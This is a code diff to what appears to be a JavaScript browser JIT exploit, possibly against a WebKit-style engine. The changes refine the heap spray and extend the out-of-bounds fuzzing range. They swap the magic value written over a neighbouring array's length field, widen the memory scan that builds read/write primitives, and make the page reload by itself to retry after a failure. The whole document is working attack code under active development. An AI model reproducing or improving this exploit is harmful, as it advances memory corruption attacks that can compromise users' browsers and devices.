@@ -102,6 +102,15 @@
         toString() {
             return '0x' + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
         }
+        add(val) {
+             let new_low = this.low + val;
+             let new_high = this.high;
+             if (new_low > 0xFFFFFFFF) {
+                 new_high += 1;
+                 new_low = new_low >>> 0;
+             }
+             return new Int64(new_low, new_high);
+        }
     }
 
     // Double <-> Int64 Conversion Buffers
@@ -140,16 +149,15 @@
         logger.info("Building R/W Primitives...");
 
         // Debug: Check master length
-        if (oob_master.length < 0x10000) {
-            logger.warn(`Warning: oob_master length is only ${oob_master.length}. Searching might fail.`);
+        // We expect at least 0x13370 (approx 78,000)
+        if (oob_master.length < 0x1000) {
+            logger.warn(`Warning: oob_master length is only ${oob_master.length}. Search might fail.`);
         } else {
-            logger.info(`oob_master length is huge: ${oob_master.length} (Good)`);
+            logger.info(`oob_master length is extended: ${oob_master.length} (Good)`);
         }
 
         // 1. Tag ALL object arrays with Float Markers
         // We use a float where Low=Index and High=Marker
-        // This ensures the raw memory matches exactly what we look for in the Double array scan.
-        
         for (let i = 0; i < global_arrays.length; i++) {
              // 0x41414141 in high bits acts as a signature
              // i in low bits acts as the ID
@@ -160,8 +168,11 @@
         // 2. Scan memory using the Master array
         let found_slave_id = -1;
         
-        // We scan a larger range now that we have a huge length
-        for (let i = 0; i < 0x20000; i++) {
+        // Scan up to the limit of our corrupted length
+        let scan_limit = oob_master.length; 
+        if(scan_limit > 0x50000) scan_limit = 0x50000; // Cap it to save time
+
+        for (let i = 0; i < scan_limit; i++) {
             let val = f2i(oob_master[i]);
             
             // Check for our signature 0x41414141 in high bits
@@ -262,7 +273,7 @@
         logger.info("Triggering OOB...");
         global_arrays = []; 
         
-        for (let i = 0; i < 512; i++) {
+        for (let i = 0; i < 1024; i++) { // Increased target pool
             let dbl_arr = new Array(16).fill(1.1);
             let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}];
             global_arrays.push({ d: dbl_arr, o: obj_arr });
@@ -276,33 +287,43 @@
 
         for (let i = 0; i < 10000; i++) vulnerable_jit(global_arrays[0].d, 0, 1.1);
 
-        logger.warn("Fuzzing OOB index...");
+        logger.warn("Fuzzing OOB index (Extended Range)...");
         
         try {
-            let target_array_wrapper = global_arrays[256];
+            // We use an index in the middle of the pack
+            let target_array_wrapper = global_arrays[512];
             let target_array = target_array_wrapper.d;
             
-            // MAGIC FIX: 
-            // We construct a double that, when written to memory, sets the neighbor's 32-bit length field to 0xFFFFFFFF.
-            // 0xFFFFFFFF in low bits, 0x00000000 in high bits.
-            let magic_len = i2f(0xFFFFFFFF, 0x00000000); 
+            // MAGIC VALUE: 
+            // 0x13370 (approx 78,000) length. 
+            // 0x00000000 in high bits to avoid killing StructureID.
+            // This is safer than 0xFFFFFFFF.
+            let magic_len = i2f(0x13370, 0x00000000); 
 
-            for (let offset = 0; offset < 256; offset++) { 
+            // Extended Fuzz Range: 0 to 2048 (covers 16KB of memory ahead)
+            for (let offset = 0; offset < 2048; offset++) { 
                 vulnerable_jit(target_array, offset, magic_len);
                 
-                // We must check if ANY array got corrupted with a huge length
-                if (offset % 5 === 0) { 
+                // Optimized Check:
+                // Only check global arrays every 50 iterations to save CPU
+                if (offset % 50 === 0) { 
                     for (let i = 0; i < global_arrays.length; i++) {
-                        // Check for length > 0x10000 to confirm we hit the massive magic value
-                        if (global_arrays[i].d.length > 0x10000) {
+                        if (global_arrays[i].d.length > 0x1000) {
                             logger.success(`SUCCESS! Found massive array at index ${i}`);
-                            logger.info(`New Length: ${global_arrays[i].d.length}`);
+                            logger.info(`New Length: ${global_arrays[i].d.length.toString(16)}`);
                             oob_master = global_arrays[i].d;
-                            
-                            // Note: We don't know the slave yet, setupPrimitives will find it
                             return true;
                         }
                     }
+                }
+            }
+            
+            // Final check
+            for (let i = 0; i < global_arrays.length; i++) {
+                if (global_arrays[i].d.length > 0x1000) {
+                    logger.success(`SUCCESS! Found massive array at index ${i}`);
+                    oob_master = global_arrays[i].d;
+                    return true;
                 }
             }
 
@@ -328,7 +349,9 @@
                             }
                         }, 500);
                     } else {
-                        logger.setStatus("Failed at Trigger.");
+                        logger.setStatus("Failed. Retrying...");
+                        // Auto-retry if failed
+                        setTimeout(() => location.reload(), 1000);
                     }
                 }, 500);
             }
